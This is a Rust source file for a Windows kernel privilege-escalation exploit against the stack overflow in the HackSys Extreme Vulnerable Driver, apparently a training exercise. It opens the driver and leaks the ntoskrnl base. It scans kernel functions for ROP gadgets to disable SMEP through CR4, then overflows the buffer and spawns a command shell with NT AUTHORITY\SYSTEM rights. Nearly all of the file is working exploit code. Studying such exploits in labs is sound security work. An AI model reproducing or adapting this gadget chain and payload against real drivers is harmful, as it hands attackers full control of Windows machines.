use std::ffi::c_void;

use exploitation::{
    build_shellcode, get_device_handle, get_driver_base_address, get_function_address_by_name,
    pattern_scan, send_io_control, spawn_shell, DEVICE_NAME, HEVD_IOCTL_STACK_OVERFLOW,
};

fn main() {
    println!("Windows Kernel Exploitation - Buffer Overflow (Stack Overflow) by memN0ps");

    /* Get a handle to the vulnerable kernel driver */
    println!("[+] Opening Vulnerable Device: {}", DEVICE_NAME);
    let device_handle = match get_device_handle(DEVICE_NAME) {
        Ok(handle) => handle,
        Err(e) => panic!("[-] Failed to get device handle: {}", e),
    };
    println!("\t[*] Device Handle: {:#x}", device_handle);

    println!("[+] Gathering Kernel Information");

    let ntoskrnl_kernel_addy = match get_driver_base_address("ntoskrnl.exe") {
        Ok(address) => address,
        Err(e) => panic!("[-] Failed to get ntoskrnl.exe base address: {}", e),
    };

    println!("\t[*] Loaded Kernel: ntoskrnl.exe");
    println!("\t[*] Base Address: {:#x}", ntoskrnl_kernel_addy);

    println!("[+] Building Payload");
    /* Generate payload */
    let payload = match build_shellcode() {
        Ok(payload) => payload,
        Err(e) => panic!("[-] Failed to setup payload: {}", e),
    };
    println!("\t[*] Payload: {:#p}", payload);

    println!("[+] Searching ROP Chain");

    // Disable SMEP
    let rop = match search_build_smep_disable_rop_chain(
        "ntoskrnl.exe\0",
        ntoskrnl_kernel_addy,
        payload,
    ) {
        Ok(rop) => rop,
        Err(e) => panic!("[-] Failed to build ROP chain: {}", e),
    };

    let ret_overwrite_offset = 0x818;
    let mut buffer: Vec<u8> = vec![0x41; ret_overwrite_offset];
    buffer.extend_from_slice(&rop);

    /* Send the control code with buffer to the vulnerable driver */
    println!("[+] Triggering Stack Buffer Overflow");
    println!("\t[*] Buffer: {:?}", buffer);
    println!("\t[*] Buffer Length: {}", buffer.len());
    println!(
        "\t[*] Sending IOCTL Code: {:#x}",
        *HEVD_IOCTL_STACK_OVERFLOW
    );

    match send_io_control(
        device_handle,
        *HEVD_IOCTL_STACK_OVERFLOW,
        buffer.as_mut_ptr() as _,
        buffer.len() as _,
    ) {
        Ok(_) => println!("\t[*] Successfully Sent IOCTL"),
        Err(e) => panic!("[-] Failed to send IOCTL: {}", e),
    };

    /* We have successfully elevated our privileges */
    println!("[+] Spawning CMD with SYSTEM privilege");
    let _pid = match spawn_shell() {
        Ok(_) => println!("\t[*] Successfully Spawned CMD with NT AUTHORITY\\SYSTEM Privilege"),
        Err(e) => panic!("[-] Failed to spawn CMD: {}", e),
    };

    println!("[+] W00TW00T NT AUTHORITY\\SYSTEM");
}

pub fn search_build_smep_disable_rop_chain(
    kernel_name: &str,
    kernel_base: usize,
    shellcode_address: *mut c_void,
) -> Result<Vec<u8>, String> {
    //
    // KeReenterRetpolinedCode
    //

    let (ntoskrnl_user_addy, user_kereenter_retpolined_code_addy) =
        match get_function_address_by_name(kernel_name, "KeReenterRetpolinedCode\0") {
            Ok((ntoskrnl_addy, user_addy)) => (ntoskrnl_addy, user_addy),
            Err(e) => return Err(e),
        };

    /* Subtract ntoskrnl base in user mode to get the offset */
    let mut kernel_kereenter_retpolined_code_addy =
        user_kereenter_retpolined_code_addy - ntoskrnl_user_addy as u64;
    println!(
        "\t[*] KeReenterRetpolinedCode Offset: {:#x}",
        kernel_kereenter_retpolined_code_addy
    );

    /* To find KeReenterRetpolinedCode address in kernel land add the base of ntoskrnl in kernel land */
    kernel_kereenter_retpolined_code_addy += kernel_base as u64;
    println!(
        "\t[*] Kernel Mode KeReenterRetpolinedCode Address: {:#x}",
        kernel_kereenter_retpolined_code_addy
    );

    println!("\t[*] Reading bytes from User KeReenterRetpolinedCode");
    /* Read data from KeReenterRetpolinedCode */
    let slice = unsafe {
        core::slice::from_raw_parts(user_kereenter_retpolined_code_addy as *mut u8, 400 as usize)
    };
    println!("\t[*] Finding ROP Gadgets from KeReenterRetpolinedCode");

    /* search for pop rcx; ret starting from KeReenterRetpolinedCode */
    let pop_rcx_rop_offset = match pattern_scan(slice, "59 C3") {
        Ok(Some(address)) => address,
        Ok(None) => return Err(format!("Failed to find POP RCX; RET")),
        Err(_) => return Err(format!("Failed to pattern scan")),
    };

    println!("\t[*] POP RCX; RET Offset: {:#x}", pop_rcx_rop_offset);
    let pop_rcx_rop_address = kernel_kereenter_retpolined_code_addy + pop_rcx_rop_offset as u64;
    println!("\t[*] POP RCX; RET Address: {:#x}", pop_rcx_rop_address);

    //
    // KeFlushCurrentTbImmediately
    //

    let (ntoskrnl_user_addy, user_ke_flush_current_tb_immediately) =
        match get_function_address_by_name(kernel_name, "KeFlushCurrentTbImmediately\0") {
            Ok((ntoskrnl_addy, user_addy)) => (ntoskrnl_addy, user_addy),
            Err(e) => return Err(e),
        };

    /* Subtract ntoskrnl base in user mode to get the offset */
    let mut kernel_ke_flush_current_tb_immediately =
        user_ke_flush_current_tb_immediately - ntoskrnl_user_addy as u64;
    println!(
        "\t[*] KeFlushCurrentTbImmediately Offset: {:#x}",
        kernel_ke_flush_current_tb_immediately
    );

    /* To find KeFlushCurrentTbImmediately address in kernel land add the base of ntoskrnl in kernel land */
    kernel_ke_flush_current_tb_immediately += kernel_base as u64;
    println!(
        "\t[*] Kernel Mode KeFlushCurrentTbImmediately Address: {:#x}",
        kernel_ke_flush_current_tb_immediately
    );

    println!("\t[*] Reading bytes from User KeFlushCurrentTbImmediately");
    /* Read data from KeFlushCurrentTbImmediately */
    let data =
        unsafe { std::slice::from_raw_parts(user_ke_flush_current_tb_immediately as *mut u8, 50) };
    println!("\t[*] Finding ROP Gadgets from KeFlushCurrentTbImmediately");

    /* search for mov cr4, rcx; ret starting from KeFlushCurrentTbImmediately */
    let mov_cr4_rcx_rop_offset = match pattern_scan(data, "0F 22 E1 C3") {
        Ok(Some(address)) => address,
        Ok(None) => return Err(format!("Failed to find MOV CR4, RCX; RET")),
        Err(_) => return Err(format!("Failed to pattern scan")),
    };

    println!(
        "\t[*] MOV CR4, RCX; RET Offset: {:#x}",
        mov_cr4_rcx_rop_offset
    );
    let mov_cr4_rcx_rop_address =
        kernel_ke_flush_current_tb_immediately + mov_cr4_rcx_rop_offset as u64;
    println!(
        "\t[*] MOV CR4, RCX; RET Address: {:#x}",
        mov_cr4_rcx_rop_address
    );

    let mut rop_chain: Vec<u8> = Vec::new();
    rop_chain.extend_from_slice(&pop_rcx_rop_address.to_le_bytes());
    rop_chain.extend_from_slice(&0x270678u64.to_le_bytes());
    rop_chain.extend_from_slice(&mov_cr4_rcx_rop_address.to_le_bytes());
    rop_chain.extend_from_slice(&(shellcode_address as u64).to_le_bytes());

    Ok(rop_chain)
}
